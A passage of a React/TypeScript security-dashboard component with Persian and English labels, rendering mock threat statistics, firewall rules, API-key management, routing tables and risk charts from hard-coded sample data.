        { action: "BGP Route Revocation Applied", actionFa: "اعمال انسداد در سطح روتینگ", desc: "Tunnel drop triggered. Target IP blacklisted inside core proxy nodes", descFa: "اتصال قطع شد و آدرس آی‌پی هدف در هسته فایروال بلک‌لیست گردید", time: "10:50:02", type: "SEVERE", status: "EVICTED", "statusFa": "سرور بلاک شد" }
      ]
    }
  ]);

  const handleKillSession = (id: string, name: string) => {
    setSessionList(sessionList.filter(s => s.id !== id));
    setSessionSuccessMsg(isRtl ? `دسترسی ادمین ${name} با موفقیت لغو شد` : `Access of admin ${name} revoked.`);
    setTimeout(() => setSessionSuccessMsg(""), 3000);
  };

  // --- SUBVIEW 4: DEVELOPER API KEYS ---
  const [apiKeyList, setApiKeyList] = useState([
    { id: "k1", name: "Risk Assessment Production Service", token: "sk_live_de71bc88fac2a", created: "2026-05-12", scope: "Full Access" },
    { id: "k2", name: "Threat Stream Analytics", token: "sk_live_fb45aa92be12a", created: "2026-05-24", scope: "Read-only" },
  ]);
  const [newKeyName, setNewKeyName] = useState("");
  const [apiKeySuccessMsg, setApiKeySuccessMsg] = useState("");

  const handleGenerateKey = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newKeyName.trim()) return;

    const randToken = "sk_live_" + Math.random().toString(16).substring(2, 15);
    setApiKeyList([
      ...apiKeyList,
      {
        id: Math.random().toString(),
        name: newKeyName,
        token: randToken,
        created: new Date().toISOString().split("T")[0],
        scope: "Full Access",
      }
    ]);
    setNewKeyName("");
    setApiKeySuccessMsg(isRtl ? "کلید API جدید با موفقیت صادر شد و آماده استفاده است" : "New API token issued successfully");
    setTimeout(() => setApiKeySuccessMsg(""), 3000);
  };

  const handleRevokeKey = (id: string) => {
    setApiKeyList(apiKeyList.filter(k => k.id !== id));
    setApiKeySuccessMsg(isRtl ? "کلید دسترسی با موفقیت باطل شد" : "Access token revoked instantly");
    setTimeout(() => setApiKeySuccessMsg(""), 3000);
  };

  // --- SUBVIEW: DYNAMIC API USAGE & SANDBOX STATE ---
  const [apiUsageSuccessMsg, setApiUsageSuccessMsg] = useState("");
  const [apiRequestsChart, setApiRequestsChart] = useState([
    { hour: "00:00", requests: 38200, latency: 45, errorRate: 0.1 },
    { hour: "04:00", requests: 29400, latency: 42, errorRate: 0.3 },
    { hour: "08:00", requests: 72100, latency: 68, errorRate: 1.2 },
    { hour: "12:00", requests: 111500, latency: 89, errorRate: 2.1 },
    { hour: "16:00", requests: 139200, latency: 95, errorRate: 1.5 },
    { hour: "20:00", requests: 94800, latency: 54, errorRate: 0.5 },
  ]);

  const [sandboxDocEndpoint, setSandboxDocEndpoint] = useState("evaluate");
  const [sandboxInputIp, setSandboxInputIp] = useState("185.190.140.10");
  const [sandboxInputDevice, setSandboxInputDevice] = useState("Apple iPhone 15");
  const [sandboxIsTesting, setSandboxIsTesting] = useState(false);
  const [sandboxResponse, setSandboxResponse] = useState<any>(null);

  const [sdkSelectedLanguage, setSdkSelectedLanguage] = useState("python");
  const [sdkConfigAction, setSdkConfigAction] = useState("block");
  const [sdkConfigSensitivity, setSdkConfigSensitivity] = useState("medium");

  // --- SUBVIEW: DYNAMIC INTEGRATION GUIDE STATES ---
  const [guideSelectedEndpoint, setGuideSelectedEndpoint] = useState("evaluate");
  const [guideSelectedSdk, setGuideSelectedSdk] = useState("python");
  const [guideSecurityStrictness, setGuideSecurityStrictness] = useState("balanced");
  const [guideAuthMethod, setGuideAuthMethod] = useState("bearer");
  const [guideSuccessMsg, setGuideSuccessMsg] = useState("");

  // --- SUBVIEW 5: INFRASTRUCTURE SETTINGS ---
  const [fwHardwareCheck, setFwHardwareCheck] = useState(true);
  const [fwVpnBlock, setFwVpnBlock] = useState(true);
  const [fwRateLimiter, setFwRateLimiter] = useState(true);
  const [fwSensitivity, setFwSensitivity] = useState(70);
  const [settingsSuccess, setSettingsSuccess] = useState("");

  // Sub-navigation indicator for the professional System Core Audit View
  const [auditLogsSubTab, setAuditLogsSubTab] = useState<"firewall" | "tokens" | "routing">("firewall");

  // --- REVOLUTIONARY SYSTEM CORE AUDIT & SECURITY STATES ---
  const [fwMode, setFwMode] = useState<"active" | "inspection" | "bypass">("active");
  const [fwIpToBan, setFwIpToBan] = useState("");
  const [fwRulePort, setFwRulePort] = useState("80");
  const [fwRuleProtocol, setFwRuleProtocol] = useState<"TCP" | "UDP" | "ICMP">("TCP");
  const [fwRuleAction, setFwRuleAction] = useState<"BLOCK" | "ALLOW" | "CHALLENGE">("BLOCK");
  const [fwRulesList, setFwRulesList] = useState([
    { id: "fw1", ruleName: "Block Dangerous Exit IPs", source: "TorExitNodes", port: "ALL", protocol: "ALL", action: "BLOCK", hits: 2841, status: "active" },
    { id: "fw2", ruleName: "Allow TLS Inbound Adapter", source: "ANY", port: "443", protocol: "TCP", action: "ALLOW", hits: 45192, status: "active" },
    { id: "fw3", ruleName: "Challenge Plain HTTP Port", source: "ANY", port: "80", protocol: "TCP", action: "CHALLENGE", hits: 3412, status: "active" },
    { id: "fw4", ruleName: "Anti-DDoS UDP Floods", source: "ANY", port: "ANY", protocol: "UDP", action: "BLOCK", hits: 142, status: "active" }
  ]);

  const [tokClient, setTokClient] = useState("");
  const [tokType, setTokType] = useState<"api_key" | "jwt" | "m2m" | "fido2">("api_key");
  const [tokClearance, setTokClearance] = useState<"1" | "2" | "3" | "4">("1");
  const [tokAlgo, setTokAlgo] = useState<"SHA-256" | "ECDSA-P256" | "RSA-4096">("SHA-256");
  const [tokDuration, setTokDuration] = useState<"30days" | "1year" | "never">("30days");
  const [tokensList, setTokensList] = useState([
    { id: "t1", client: "Telemetry Syncer Core", type: "m2m", key: "sk_live_tele_0b7b...8a2a", clearance: "Level 4 (System)", algo: "SHA-256", created: "2026-05-28 14:12", status: "active" },
    { id: "t2", client: "Public API Shield SDK Client", type: "api_key", key: "sk_live_shld_e3ca...15ee", clearance: "Level 2 (Operator)", algo: "ECDSA-P256", created: "2026-05-29 09:44", status: "active" },
    { id: "t3", client: "Legacy Auditing Webhook", type: "jwt", key: "sk_live_legy_aa0d...ff12", clearance: "Level 3 (Read-Only)", algo: "RSA-4096", created: "2026-05-30 08:00", status: "revoked" }
  ]);

  const [routeDest, setRouteDest] = useState("");
  const [routeGw, setRouteGw] = useState("");
  const [routeIface, setRouteIface] = useState<"eth0" | "eth1" | "wg0" | "lo">("eth0");
  const [routeMetric, setRouteMetric] = useState(10);
  const [routePriority, setRoutePriority] = useState<"high" | "normal" | "low">("normal");
  const [routesList, setRoutesList] = useState([
    { id: "r1", destination: "0.0.0.0/0", gateway: "193.12.99.1", interface: "eth0", metric: 10, priority: "high", status: "online" },
    { id: "r2", destination: "10.150.0.0/16", gateway: "10.150.0.1", interface: "wg0", metric: 20, priority: "high", status: "online" },
    { id: "r3", destination: "192.168.1.0/24", gateway: "192.168.1.1", interface: "eth1", metric: 100, priority: "normal", status: "online" },
    { id: "r4", destination: "127.0.0.1/32", gateway: "0.0.0.0", interface: "lo", metric: 1, priority: "normal", status: "online" }
  ]);

  const [routePingIp, setRoutePingIp] = useState("8.8.8.8");
  const [routePingLog, setRoutePingLog] = useState<string[]>([]);
  const [routePingRunning, setRoutePingRunning] = useState(false);

  const handleSaveSettings = () => {
    setSettingsSuccess(isRtl ? "تنظیمات فایروال با موفقیت روی سرور اعمال شدند" : "Firewall configurations deployed on proxy");
    setTimeout(() => setSettingsSuccess(""), 3000);
  };


  // --- RENDER CONTENT BY ACTIVE TAB ---

  // 1) GLOBAL VIEW: THE ORIGINAL COMPREHENSIVE DASHBOARD (FULLY TRANSLATED)
  if (activeTab === "overview") {
    return (
      <div className="p-4 md:p-6 space-y-4 md:space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        {/* ROW 1: STATS */}
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
          <StatCard
            title={t("totalRequests")}
            val="12.4M"
            trendStr="18.2%"
            isPos={true}
            icon={Clock}
            color="#10B981"
            sparkData={sparkG}
          />
          <StatCard
            title={t("blockedRequests")}
            val="32.6K"
            trendStr="7.1%"
            isPos={false}
            icon={ShieldAlert}
            color="#F43F5E"
            sparkData={sparkR}
          />
          <StatCard
            title={t("avgRiskScore")}
            val="64"
            trendStr="5.4%"
            isPos={false}
            icon={Shield}
            color="#F59E0B"
            sparkData={sparkY}
          />
          <StatCard
            title={t("activeSessions")}
            val="120K"
            trendStr="11.3%"
            isPos={true}
            icon={Server}
            color="#10B981"
            sparkData={sparkG}
          />
          <StatCard
            title={t("threatsDetected")}
            val="1.2K"
            trendStr="14.7%"
            isPos={false}
            icon={CloudLightning}
            color="#F43F5E"
            sparkData={sparkR}
          />
        </div>

        {/* ROW 2 */}
        <div className="flex flex-col lg:flex-row gap-4 min-h-[560px]">
          {/* Real-time Traffic & Geographical Heatmap */}
          <SectionCard
            title={t("realTimeTraffic")}
            className="lg:w-[48%] flex-1"
            action={
              <div className="flex items-center gap-1.5 text-xs text-emerald-400 font-medium">
                <span className="relative flex h-2 w-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                </span>
                {isRtl ? "شبکه فیلترینگ تهدیدات فعال است" : "Security Threat Grid Active"}
              </div>
            }
          >
            <TrafficMap />
          </SectionCard>

          {/* Risk Score Dist */}
          <SectionCard
            title={t("riskScoreDistribution")}
            className="lg:w-[25%] flex-shrink-0"
          >
            <div className="flex flex-col h-full items-center justify-between">
              <div className="w-full flex items-center justify-center gap-6 mt-4">
                <div className="relative w-32 h-32">
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={[
                          { val: 18.5, fill: "#E11D48" },
                          { val: 33.1, fill: "#F59E0B" },
                          { val: 48.4, fill: "#10B981" },
                        ]}
                        dataKey="val"
                        innerRadius={42}
                        outerRadius={56}
                        stroke="none"
                      />
                    </PieChart>
                  </ResponsiveContainer>
                  <div className="absolute inset-0 flex flex-col items-center justify-center pointer-events-none">
                    <span className="text-lg font-bold text-white">12.4M</span>
                    <span className="text-[10px] text-slate-400">{t("total")}</span>
                  </div>
                </div>
                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-2.5 h-2.5 rounded-sm bg-rose-600"></div>
                    <div>
                      <div className="text-xs text-slate-200">{t("highRisk")}</div>
                      <div className="text-[10px] text-slate-500">
                        2.3M (18.5%)
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-2.5 h-2.5 rounded-sm bg-amber-500"></div>
                    <div>
                      <div className="text-xs text-slate-200">{t("mediumRisk")}</div>
                      <div className="text-[10px] text-slate-500">
                        4.1M (33.1%)
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-2.5 h-2.5 rounded-sm bg-emerald-500"></div>
                    <div>
                      <div className="text-xs text-slate-200">{t("lowRisk")}</div>
                      <div className="text-[10px] text-slate-500">
                        6.0M (48.4%)
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Bar Chart */}
              <div className="w-full h-28 mt-auto border-t border-dash-border/50 pt-3">
                <ResponsiveContainer width="100%" height="100%">
                  <BarChart data={riskDistBarData}>
                    <Bar dataKey="val" fill="#4F46E5" radius={[2, 2, 0, 0]} />
                    <XAxis dataKey="x" hide />
                    <YAxis hide />
                  </BarChart>
                </ResponsiveContainer>
                <div className="flex justify-between text-[9px] text-slate-500 px-1 mt-1 font-mono">
                  <span>0</span>
                  <span>20</span>
                  <span>40</span>
                  <span>60</span>
                  <span>80</span>
                  <span>100</span>
                </div>
              </div>
            </div>
          </SectionCard>

          {/* Live Threat Feed */}
          <SectionCard
            title={t("liveThreatFeed")}
            className="lg:w-[30%] flex-shrink-0"
            action={
              <div className="flex items-center gap-1.5 font-mono text-[10px]">
                <span className={cn(
                  "w-1.5 h-1.5 rounded-full inline-block",
                  wsStatus === "connected" ? "bg-emerald-500 animate-pulse" :
                  wsStatus === "connecting" ? "bg-amber-500 animate-pulse" : "bg-rose-500"
                )} />
                <span className="text-slate-500 uppercase tracking-widest text-[9px]">
                  {wsStatus === "connected" ? (isRtl ? "زنده" : "Live") :
                   wsStatus === "connecting" ? (isRtl ? "در حال اتصال" : "Connecting") : (isRtl ? "قطع" : "Offline")}
                </span>
              </div>
            }
          >
            <div className="space-y-4 overflow-y-auto custom-scrollbar pr-2 h-full absolute inset-x-5 py-4 top-0 bottom-0">
              {liveEvents.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-full text-center space-y-2 py-8">
                  <span className="relative flex h-3 w-3">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-indigo-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-3 w-3 bg-indigo-500"></span>
                  </span>
                  <div className="text-xs text-slate-400 font-sans">
                    {isRtl ? "در انتظار سیگنال‌های امنیتی شبکه..." : "Waiting for network intelligence stream..."}
                  </div>
                </div>
              ) : (
                liveEvents.slice(0, 7).map((feed) => {
                  const clocText = isRtl ? feed.clocFa : feed.clocEn;
                  const typeText = isRtl ? feed.typeFa : feed.typeEn;
                  const elapsed = getRelativeTime(feed.timestamp);
                  return (
                    <div
                      key={feed.id}
                      className="flex items-center justify-between group cursor-pointer hover:bg-slate-800/30 p-2 rounded -mx-2 transition-colors duration-150"
                    >
                      <div className="flex items-start gap-3">
                        <div className="text-xl mt-0.5">{feed.flag}</div>
                        <div>
                          <div className="text-sm font-medium text-slate-200">
                            {feed.ip}
                          </div>
                          <div className="text-[11px] text-slate-500">
                            {clocText}
                          </div>
                          <div className="text-[10px] text-slate-600 font-mono mt-0.5">
                            {elapsed}
                          </div>
                        </div>
                      </div>
                      <div className="flex flex-col items-end gap-1.5">
                        <div className="flex items-center gap-2">
                          <span
                            className={cn(
                              "px-2 py-0.5 rounded text-[10px] font-bold border",
                              feed.c === "rose"
                                ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                                : feed.c === "amber"
                                  ? "bg-amber-500/10 text-amber-400 border-amber-500/20"
                                  : "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                            )}
                          >
                            {t("risk")} {feed.rScore}
                          </span>
                          <Plus className="w-3.5 h-3.5 text-slate-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                        </div>
                        <div
                          className={cn(
                            "text-[11px] font-medium",
                            feed.c === "rose"
                              ? "text-rose-500"
                              : feed.c === "amber"
                                ? "text-amber-500"
                                : "text-emerald-500"
                          )}
                        >
                          {typeText}
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </SectionCard>
        </div>

        {/* ROW 3 */}
        <div className="flex flex-col xl:flex-row gap-4 h-auto xl:h-[280px]">
          {/* Requests Over Time */}
          <SectionCard
            title={t("requestsOverTime")}
            className="xl:w-[40%]"
            action={
              <button className="flex items-center gap-1.5 text-slate-400 bg-slate-900 border border-slate-700/50 px-2 py-1 rounded text-[11px] hover:text-slate-200 transition-colors">
                {t("last24Hours")} <ChevronDown className="w-3 h-3" />
              </button>
            }
          >
            <div className="absolute right-5 top-5 bg-indigo-600 text-white text-[10px] font-bold px-2 py-1 rounded shadow-lg z-10 pointer-events-none ltr:right-5 ltr:left-auto rtl:left-5 rtl:right-auto">
              15.7M
            </div>
            <div className="w-full h-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart
                  data={reqOverTimeData}
                  margin={{ top: 20, right: 0, left: -25, bottom: 0 }}
                >
                  <defs>
                    <linearGradient id="colorReq" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#4F46E5" stopOpacity={0.4} />
                      <stop offset="95%" stopColor="#4F46E5" stopOpacity={0} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid
                    strokeDasharray="3 3"
                    vertical={false}
                    stroke="#1F2937"
                  />
                  <XAxis dataKey="time" hide />
                  <YAxis
                    stroke="#475569"
                    fontSize={10}
                    tickLine={false}
                    axisLine={false}
                    tickFormatter={(v) => v + "M"}
                  />
                  <Tooltip
                    cursor={{ stroke: "#4F46E5", strokeWidth: 1 }}
                    contentStyle={{
                      backgroundColor: "#090B10",
                      borderColor: "#1F2937",
                      color: "#F8FAFC",
                    }}
                  />
                  <Area
                    type="monotone"
                    dataKey="val"
                    stroke="#818CF8"
                    strokeWidth={2}
                    fillOpacity={1}
                    fill="url(#colorReq)"
                  />
                </AreaChart>
              </ResponsiveContainer>
              <div className="flex justify-between text-[10px] text-slate-500 px-6 mt-1 absolute bottom-2 left-6 right-0">
                <span>18:00</span>
                <span>00:00</span>
                <span>06:00</span>
                <span>12:00</span>
                <span>18:00</span>
              </div>
            </div>
          </SectionCard>

          {/* System Status */}
          <SectionCard title={t("systemStatus")} className="xl:w-[20%]">
            <div className="flex flex-col h-full justify-between pb-1">
              <div className="space-y-3 mt-1">
                {[
                  { n: "API Gateway", v: "12ms" },
                  { n: "Kafka Cluster", v: "8ms" },
                  { n: "ClickHouse", v: "23ms" },
                  { n: "PostgreSQL", v: "16ms" },
                  { n: "Redis", v: "5ms" },
                  { n: "ML Inference", v: "45ms" },
                ].map((s, i) => (
                  <div key={i} className="flex justify-between items-center text-xs">
                    <span className="text-slate-300">{s.n}</span>
                    <div className="flex items-center gap-4">
                      <span className="flex items-center gap-1.5 text-[11px] text-emerald-400">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                        {isRtl ? "سالم" : "Healthy"}
                      </span>
                      <span className="text-[11px] text-slate-500 font-mono w-8 text-right">
                        {s.v}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
              <div className="mt-4 pt-3 border-t border-dash-border/50 flex items-center gap-2 text-emerald-400 text-xs font-medium">
                <ShieldCheck className="w-4 h-4" />
                {t("allSystemsOperational")}
              </div>
            </div>
          </SectionCard>

          {/* Recent Alerts */}
          <SectionCard
            title={t("recentAlerts")}
            className="xl:w-[20%]"
            action={
              <button className="text-[11px] text-indigo-400 hover:text-indigo-300">
                {t("seeAll")}
              </button>
            }
          >
            <div className="space-y-4">
              {[
                {
                  title: isRtl ? "نمره ریسک بالایی ثبت شد" : "High risk score detected",
                  desc: "IP: 185.220.101.23",
                  t: isRtl ? "همین الان" : "Just now",
                  c: "text-rose-500",
                },
                {
                  title: isRtl ? "نود خروجی Tor ردیابی شد" : "Tor exit node detected",
                  desc: "IP: 79.125.15.100",
                  t: isRtl ? "۱ دقیقه قبل" : "1 min ago",
                  c: "text-amber-500",
                },
                {
                  title: isRtl ? "رفتار غیر‌عادی نشست کاربر" : "Abnormal behavior detected",
                  desc: "Session: 8f3a9...d2",
                  t: isRtl ? "۳ دقیقه قبل" : "3 min ago",
                  c: "text-amber-500",
                },
                {
                  title: isRtl ? "تعداد مجاز درخواست در دقیقه" : "Rate limit exceeded",
                  desc: "IP: 45.133.22.15",
                  t: isRtl ? "۵ دقیقه قبل" : "5 min ago",
                  c: "text-amber-500",
                },
              ].map((a, i) => (
                <div key={i} className="flex items-start gap-3">
                  <div className="mt-0.5">
                    <AlertTriangle className={cn("w-4 h-4", a.c)} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-start justify-between gap-2">
                      <div
                        className={cn(
                          "text-[12px] font-bold leading-tight truncate",
                          a.c
                        )}
                      >
                        {a.title}
                      </div>
                      <div className="text-[10px] text-slate-500 shrink-0">
                        {a.t}
                      </div>
                    </div>
                    <div className="text-[11px] text-slate-400 mt-0.5 font-mono truncate">
                      {a.desc}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </SectionCard>

          {/* Top Threat Categories */}
          <SectionCard
            title={t("topThreatCategories")}
            className="xl:w-[20%]"
            action={
              <button className="flex items-center gap-1.5 text-slate-400 text-[11px] hover:text-slate-200">
                {t("last24Hours")} <ChevronDown className="w-3 h-3" />
              </button>
            }
          >
            <div className="flex items-center gap-4 h-full pt-2">
              <div className="relative w-24 h-24 shrink-0">
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={[
                        { val: 32.6, fill: "#1D4ED8" },
                        { val: 18.7, fill: "#E11D48" },
                        { val: 14.3, fill: "#F59E0B" },
                        { val: 9.8, fill: "#8B5CF6" },
                        { val: 5.1, fill: "#0EA5E9" },
                        { val: 19.5, fill: "#475569" },
                      ]}
                      dataKey="val"
                      innerRadius={28}
                      outerRadius={42}
                      stroke="none"
                    />
                  </PieChart>
                </ResponsiveContainer>
                <div className="absolute inset-0 flex flex-col items-center justify-center -mt-0.5">
                  <span className="text-sm font-bold text-white leading-none">
                    12.4K
                  </span>
                  <span className="text-[9px] text-slate-400 mt-0.5">{t("total")}</span>
                </div>
              </div>

              <div className="space-y-1.5 flex-1 overflow-hidden">
                {[
                  { n: isRtl ? "پروکسی زنده" : "VPN / Proxy", v: "32.6%", c: "bg-blue-700" },
                  { n: isRtl ? "نود تور" : "Tor Exit Node", v: "18.7%", c: "bg-rose-600" },
                  { n: isRtl ? "رفتار بات‌ها" : "Bot Behavior", v: "14.3%", c: "bg-amber-500" },
                  { n: isRtl ? "آی‌پی‌های آلوده" : "Malware IP", v: "9.8%", c: "bg-violet-500" },
                  { n: isRtl ? "حمله DDoS" : "DDoS Attack", v: "5.1%", c: "bg-sky-500" },
                  { n: isRtl ? "سایر تهدیدات" : "Other", v: "19.5%", c: "bg-slate-600" },
                ].map((threatItem, i) => (
                  <div
                    key={i}
                    className="flex items-center justify-between text-[11px]"
                  >
                    <div className="flex items-center gap-2 overflow-hidden">
                      <span className={cn("w-2 h-2 rounded-sm shrink-0", threatItem.c)}></span>
                      <span className="text-slate-300 truncate">{threatItem.n}</span>
                    </div>
                    <span className="text-slate-400 shrink-0">{threatItem.v}</span>
                  </div>
                ))}
              </div>
            </div>
          </SectionCard>
        </div>

        {/* ROW 4 */}
        <div className="flex flex-col xl:flex-row gap-4 h-auto xl:h-[300px]">
          {/* Top Risky IPs */}
          <SectionCard title={t("topRiskyIps")} className="xl:w-[32%]">
            <div className="overflow-x-auto w-full">
              <table className="w-full text-left ltr:text-left rtl:text-right">
                <thead>
                  <tr className="text-[10px] text-slate-500 uppercase border-b border-dash-border/50">
                    <th className="pb-2 font-medium">{t("ipAddress")}</th>
                    <th className="pb-2 font-medium">{t("country")}</th>
                    <th className="pb-2 font-medium">{t("risk")}</th>
                    <th className="pb-2 font-medium">{t("threatType")}</th>
                    <th className="pb-2 font-medium">{t("reqs")}</th>
                  </tr>
                </thead>
                <tbody className="text-[12px] text-slate-300">
                  {[
                    {
                      ip: "185.220.101.23",
                      cloc: isRtl ? "🇫🇮 فنلاند" : "🇫🇮 Finland",
                      r: 92,
                      t: "VPN",
                      rq: "23.4K",
                      rc: "text-rose-500 bg-rose-500/10",
                    },
                    {
                      ip: "79.125.15.100",
                      cloc: isRtl ? "🇳🇱 هلند" : "🇳🇱 Netherlands",
                      r: 95,
                      t: "Tor Exit Node",
                      rq: "18.7K",
                      rc: "text-rose-500 bg-rose-500/10",
                    },
                    {
                      ip: "45.133.22.15",
                      cloc: isRtl ? "🇺🇸 ایالت متحده" : "🇺🇸 United States",
                      r: 68,
                      t: "Suspicious IP",
                      rq: "15.2K",
                      rc: "text-amber-500 bg-amber-500/10",
                    },
                    {
                      ip: "193.34.78.90",
                      cloc: isRtl ? "🇩🇪 آلمان" : "🇩🇪 Germany",
                      r: 21,
                      t: "Low Rep",
                      rq: "12.8K",
                      rc: "text-emerald-500 bg-emerald-500/10",
                    },
                  ].map((tableRow, i) => (
                    <tr
                      key={i}
                      className="border-b border-dash-border/30 last:border-0 hover:bg-slate-800/30 transition-colors"
                    >
                      <td className="py-2.5 font-medium text-slate-200 flex items-center gap-1.5 text-xs">
                        <div className="w-2 h-2 bg-rose-500 rounded-sm"></div>{" "}
                        {tableRow.ip}
                      </td>
                      <td className="py-2.5">{tableRow.cloc}</td>
                      <td className="py-2.5">
                        <span
                          className={cn(
                            "px-1.5 py-0.5 rounded font-bold text-[10px]",
                            tableRow.rc
                          )}
                        >
                          {tableRow.r}
                        </span>
                      </td>
                      <td className="py-2.5 text-slate-400">{tableRow.t}</td>
                      <td className="py-2.5 font-mono text-slate-400">{tableRow.rq}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </SectionCard>

          {/* Risk Score Over Time */}
          <SectionCard
            title={t("riskScoreOverTime")}
            className="xl:w-[48%]"
            action={
              <div className="flex gap-4 items-center flex-row">
                <div className="hidden sm:flex items-center gap-2 text-[11px] text-slate-300">
                  <span className="w-2 h-2 bg-rose-500 rounded-sm"></span> {t("highRisk")}
                </div>
                <div className="hidden sm:flex items-center gap-2 text-[11px] text-slate-300">
                  <span className="w-2 h-2 bg-amber-500 rounded-sm"></span> {t("mediumRisk")}
                </div>
                <div className="hidden sm:flex items-center gap-2 text-[11px] text-slate-300">
                  <span className="w-2 h-2 bg-emerald-500 rounded-sm"></span> {t("lowRisk")}
                </div>
                <button className="flex items-center gap-1.5 text-slate-400 bg-slate-900 border border-slate-700/50 px-2 h-6 rounded text-[11px]">
                  {t("last24Hours")} <ChevronDown className="w-3 h-3" />
                </button>
              </div>
            }
          >
            <div className="w-full h-full">
              <ResponsiveContainer width="100%" height="100%">
                <LineChart
                  data={riskTimelineData}
                  margin={{ top: 10, right: 0, left: -25, bottom: 0 }}
                >
                  <CartesianGrid
                    strokeDasharray="3 3"
                    vertical={false}
                    stroke="#1F2937"
                  />
                  <XAxis dataKey="time" hide />
                  <YAxis
                    stroke="#475569"
                    fontSize={10}
                    tickLine={false}
                    axisLine={false}
                    tickFormatter={(v) =>
                      v === 100 ? "1K" : v === 50 ? "500" : v
                    }
                    domain={[0, "auto"]}
                  />
                  <Tooltip
                    contentStyle={{
                      backgroundColor: "#090B10",
                      borderColor: "#1F2937",
                      color: "#F8FAFC",
                    }}
                  />
                  <Line
                    type="step"
                    dataKey="low"
                    stroke="#10B981"
                    strokeWidth={2}
                    dot={false}
                    isAnimationActive={false}
                  />
                  <Line
                    type="step"
                    dataKey="medium"
                    stroke="#F59E0B"
                    strokeWidth={2}
                    dot={false}
                    isAnimationActive={false}
                  />
                  <Line
                    type="step"
                    dataKey="high"
                    stroke="#E11D48"
                    strokeWidth={2}
                    dot={false}
                    isAnimationActive={false}
                  />
                </LineChart>
              </ResponsiveContainer>
              <div className="flex justify-between text-[10px] text-slate-500 px-6 mt-1 absolute bottom-1 left-6 right-0">
                <span>18:00</span>
                <span>00:00</span>
                <span>06:00</span>
                <span>12:00</span>
                <span>18:00</span>
              </div>
            </div>
          </SectionCard>

          {/* Top Countries by Requests */}
          <SectionCard
            title={t("topCountriesByRequests")}
            className="xl:w-[20%]"
            action={
              <button className="text-[11px] text-indigo-400 hover:text-indigo-300">
                {t("viewFullAnalytics")} <ChevronRight className="w-3 h-3 inline rtl:rotate-180" />
              </button>
            }
          >
            {/* faint world map bg */}
            <div className="absolute inset-0 right-4 pt-10 pointer-events-none opacity-[0.03] flex justify-end">
              <Globe className="w-48 h-48 text-white" />
            </div>

            <div className="space-y-3 relative z-10 p-2">
              {[
                {
                  c: isRtl ? "🇺🇸 ایالات متحده" : "🇺🇸 United States",
                  v: "2.4M (19.4%)",
                  color: "bg-indigo-500",
                },
                {
                  c: isRtl ? "🇩🇪 آلمان" : "🇩🇪 Germany",
                  v: "1.6M (12.9%)",
                  color: "bg-amber-500",
                },
                {
                  c: isRtl ? "🇳🇱 هلند" : "🇳🇱 Netherlands",
                  v: "1.2M (9.7%)",
                  color: "bg-emerald-500",
                },
                {
                  c: isRtl ? "🇫🇮 فنلاند" : "🇫🇮 Finland",
                  v: "1.1M (8.9%)",
                  color: "bg-rose-500",
                },
                {
                  c: isRtl ? "🇮🇳 هند" : "🇮🇳 India",
                  v: "1.0M (8.1%)",
                  color: "bg-orange-500",
                },
                {
                  c: isRtl ? "🌐 سایر کشورها" : "🌐 Other",
                  v: "5.1M (41.0%)",
                  color: "bg-blue-500",
                },
              ].map((co, i) => (
                <div
                  key={i}
                  className="flex justify-between items-center text-[11px]"
                >
                  <div className="flex items-center gap-2.5 truncate">
                    <span
                      className={cn(
                        "w-1.5 h-1.5 rounded-full shadow-[0_0_5px_currentColor]",
                        co.color
                      )}
                    ></span>
                    <span className="text-slate-300 truncate">{co.c}</span>
                  </div>
                  <span className="text-slate-400 font-mono text-[10px] shrink-0">
                    {co.v}
                  </span>
                </div>
              ))}
            </div>
          </SectionCard>
        </div>
      </div>
    );
  }

  // 2) SUBVIEW: RISK ENGINE CONTROLS
  if (activeTab === "riskEngine") {
    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 border-b border-dash-border/40 pb-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Sliders className="w-5 h-5 text-indigo-400" />
              {isRtl ? "موتور ریسک و مدیریت سیاست‌های امنیتی" : "Risk Intelligence & Threshold Policy"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "تغییر و تنظیم ضرایب الگوریتم برای ارزیابی پایتون از سطح مجاز اعتماد نشست‌ها" 
                : "Configure algorithms and custom weights to evaluate device sessions state"}
            </p>
          </div>
          <button 
            onClick={handleSaveRiskCoeffs}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold uppercase tracking-wider rounded-lg transition-all shadow-[0_0_12px_rgba(79,70,229,0.4)]"
          >
            {isRtl ? "سیاست‌ها همگام" : "Sync Threshold Policy"}
          </button>
        </div>

        {riskSuccessMsg && (
          <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
